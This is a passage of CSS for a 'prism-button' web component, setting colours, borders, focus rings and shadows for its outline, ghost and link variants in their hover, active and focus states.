            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-info-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1));
            --shadow-color: rgba(0, 20, 58, 0.51)
        }

        .outline.positive.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-positive-base) / var(--tw-text-opacity));
            background-color: transparent;
            border-color: rgb(var(--border-color-stroke-positive-base) / var(--tw-border-opacity));
            --tw-border-opacity: 0.15
        }

        .outline.positive.sc-prism-button-default:not(.disabled):hover {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-base) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-positive-hover) / var(--tw-bg-opacity));
            --shadow-color: rgba(0, 27, 20, 0.51)
        }

        .outline.positive.sc-prism-button-default:not(.disabled):active {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-down) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-positive-down) / var(--tw-bg-opacity));
            --shadow-color: rgba(0, 16, 12, 0.51)
        }

        .outline.positive.sc-prism-button-default:not(.disabled):focus {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-focus) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-positive-focus) / var(--tw-bg-opacity));
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-positive-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1));
            --shadow-color: rgba(0, 27, 20, 0.51)
        }

        .outline.caution.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-caution-base) / var(--tw-text-opacity));
            background-color: transparent;
            border-color: rgb(var(--border-color-stroke-caution-base) / var(--tw-border-opacity));
            --tw-border-opacity: 0.15
        }

        .outline.caution.sc-prism-button-default:not(.disabled):hover {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-base) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-caution-hover) / var(--tw-bg-opacity));
            --shadow-color: rgba(58, 18, 0, 0.51)
        }

        .outline.caution.sc-prism-button-default:not(.disabled):active {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-hover) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-caution-down) / var(--tw-bg-opacity));
            --shadow-color: rgba(50, 15, 0, 0.51)
        }

        .outline.caution.sc-prism-button-default:not(.disabled):focus {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-focus) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-caution-focus) / var(--tw-bg-opacity));
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-caution-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1));
            --shadow-color: rgba(58, 18, 0, 0.51)
        }

        .outline.negative.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-negative-base) / var(--tw-text-opacity));
            background-color: transparent;
            border-color: rgb(var(--border-color-stroke-negative-base) / var(--tw-border-opacity));
            --tw-border-opacity: 0.15
        }

        .outline.negative.sc-prism-button-default:not(.disabled):hover {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-base) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-negative-hover) / var(--tw-bg-opacity));
            --shadow-color: rgba(50, 0, 15, 0.51)
        }

        .outline.negative.sc-prism-button-default:not(.disabled):active {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-hover) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-negative-down) / var(--tw-bg-opacity));
            --shadow-color: rgba(34, 0, 10, 0.51)
        }

        .outline.negative.sc-prism-button-default:not(.disabled):focus {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-focus) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-negative-focus) / var(--tw-bg-opacity));
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-negative-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1));
            --shadow-color: rgba(50, 0, 15, 0.51)
        }

        .ghost.neutral.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-neutral-base) / var(--tw-text-opacity))
        }

        .ghost.neutral.sc-prism-button-default:not(.disabled):hover {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-neutral-hover) / var(--tw-text-opacity))
        }

        .ghost.neutral.sc-prism-button-default:not(.disabled):active {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-neutral-down) / var(--tw-text-opacity))
        }

        .ghost.neutral.sc-prism-button-default:not(.disabled):focus {
            border-radius: 2px;
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-neutral-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1))
        }

        .ghost.neutral-inverse.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-base) / var(--tw-text-opacity))
        }

        .ghost.neutral-inverse.sc-prism-button-default:not(.disabled):hover {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-hover) / var(--tw-text-opacity))
        }

        .ghost.neutral-inverse.sc-prism-button-default:not(.disabled):active {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-down) / var(--tw-text-opacity))
        }

        .ghost.neutral-inverse.sc-prism-button-default:not(.disabled):focus {
            border-radius: 2px;
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-inverse-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1-inverse))
        }

        .ghost.positive.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-positive-base) / var(--tw-text-opacity))
        }

        .ghost.positive.sc-prism-button-default:not(.disabled):hover {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-positive-hover) / var(--tw-text-opacity))
        }

        .ghost.positive.sc-prism-button-default:not(.disabled):active {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-positive-down) / var(--tw-text-opacity))
        }

        .ghost.positive.sc-prism-button-default:not(.disabled):focus {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-positive-focus) / var(--tw-text-opacity));
            border-radius: 2px;
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-positive-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1))
        }

        .ghost.negative.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-negative-base) / var(--tw-text-opacity))
        }

        .ghost.negative.sc-prism-button-default:not(.disabled):hover {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-negative-hover) / var(--tw-text-opacity))
        }

        .ghost.negative.sc-prism-button-default:not(.disabled):active {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-negative-down) / var(--tw-text-opacity))
        }

        .ghost.negative.sc-prism-button-default:not(.disabled):focus {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-negative-focus) / var(--tw-text-opacity));
            border-radius: 2px;
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-negative-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1))
        }

        .ghost.caution.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-caution-base) / var(--tw-text-opacity))
        }

        .ghost.caution.sc-prism-button-default:not(.disabled):hover {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-caution-hover) / var(--tw-text-opacity))
        }

        .ghost.caution.sc-prism-button-default:not(.disabled):active {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-caution-down) / var(--tw-text-opacity))
        }

        .ghost.caution.sc-prism-button-default:not(.disabled):focus {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-caution-focus) / var(--tw-text-opacity));
            border-radius: 2px;
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-caution-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1))
        }

        .ghost.info.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-info-base) / var(--tw-text-opacity))
        }

        .ghost.info.sc-prism-button-default:not(.disabled):hover {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-info-hover) / var(--tw-text-opacity))
        }

        .ghost.info.sc-prism-button-default:not(.disabled):active {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-info-down) / var(--tw-text-opacity))
        }

        .ghost.info.sc-prism-button-default:not(.disabled):focus {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-info-focus) / var(--tw-text-opacity));
            border-radius: 2px;
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-info-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1))
        }

        .ghost.theme1.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-theme1-base) / var(--tw-text-opacity))
        }

        .ghost.theme1.sc-prism-button-default:not(.disabled):hover {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-theme1-hover) / var(--tw-text-opacity))
        }

        .ghost.theme1.sc-prism-button-default:not(.disabled):active {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-theme1-down) / var(--tw-text-opacity))
        }

        .ghost.theme1.sc-prism-button-default:not(.disabled):focus {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-theme1-focus) / var(--tw-text-opacity));
            border-radius: 2px;
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-theme1-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1))
        }

        .ghost.theme2.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-theme2-base) / var(--tw-text-opacity))
        }

        .ghost.theme2.sc-prism-button-default:not(.disabled):hover {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-theme2-hover) / var(--tw-text-opacity))
        }

        .ghost.theme2.sc-prism-button-default:not(.disabled):active {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-theme2-down) / var(--tw-text-opacity))
        }

        .ghost.theme2.sc-prism-button-default:not(.disabled):focus {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-theme2-focus) / var(--tw-text-opacity));
            border-radius: 2px;
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-theme2-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1))
        }

        .link.sc-prism-button-default {
            border-width: 0px;
            -webkit-text-decoration-line: underline;
            text-decoration-line: underline
        }

        .link.neutral.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-neutral-base) / var(--tw-text-opacity))
        }

        .link.neutral.sc-prism-button-default:not(.disabled):hover {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-neutral-hover) / var(--tw-text-opacity))
        }

        .link.neutral.sc-prism-button-default:not(.disabled):active {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-neutral-down) / var(--tw-text-opacity))
        }

        .link.neutral.sc-prism-button-default:not(.disabled):focus {
            border-radius: 2px;
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-neutral-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1))
        }

        .link.neutral-inverse.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-base) / var(--tw-text-opacity))
        }

        .link.neutral-inverse.sc-prism-button-default:not(.disabled):hover {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-hover) / var(--tw-text-opacity))
        }

        .link.neutral-inverse.sc-prism-button-default:not(.disabled):active {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-down) / var(--tw-text-opacity))
        }

        .link.neutral-inverse.sc-prism-button-default:not(.disabled):focus {
            border-radius: 2px;
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-inverse-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1-inverse))
        }

        .link.theme1.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-theme1-base) / var(--tw-text-opacity))
        }

        .link.theme1.sc-prism-button-default:not(.disabled):hover {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-theme1-hover) / var(--tw-text-opacity))
        }

        .link.theme1.sc-prism-button-default:not(.disabled):active {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-theme1-down) / var(--tw-text-opacity))
        }

        .link.theme1.sc-prism-button-default:not(.disabled):focus {
            border-radius: 2px;
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-theme1-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1))
        }

        .link.theme2.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-theme1-base) / var(--tw-text-opacity))
        }

        .link.theme2.sc-prism-button-default:not(.disabled):hover {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-theme2-hover) / var(--tw-text-opacity))
        }

        .link.theme2.sc-prism-button-default:not(.disabled):active {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-theme2-down) / var(--tw-text-opacity))
        }

        .link.theme2.sc-prism-button-default:not(.disabled):focus {
            border-radius: 2px;
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-theme2-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1))
        }

        .link.info.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-info-base) / var(--tw-text-opacity))
        }

        .link.info.sc-prism-button-default:not(.disabled):hover {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-info-hover) / var(--tw-text-opacity))
        }

        .link.info.sc-prism-button-default:not(.disabled):active {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-info-down) / var(--tw-text-opacity))
        }

        .link.info.sc-prism-button-default:not(.disabled):focus {
            border-radius: 2px;
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-info-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1))
        }

        .link.positive.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-positive-base) / var(--tw-text-opacity))
        }

        .link.positive.sc-prism-button-default:not(.disabled):hover {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-positive-hover) / var(--tw-text-opacity))
        }

        .link.positive.sc-prism-button-default:not(.disabled):active {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-positive-down) / var(--tw-text-opacity))
        }

        .link.positive.sc-prism-button-default:not(.disabled):focus {
            border-radius: 2px;
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
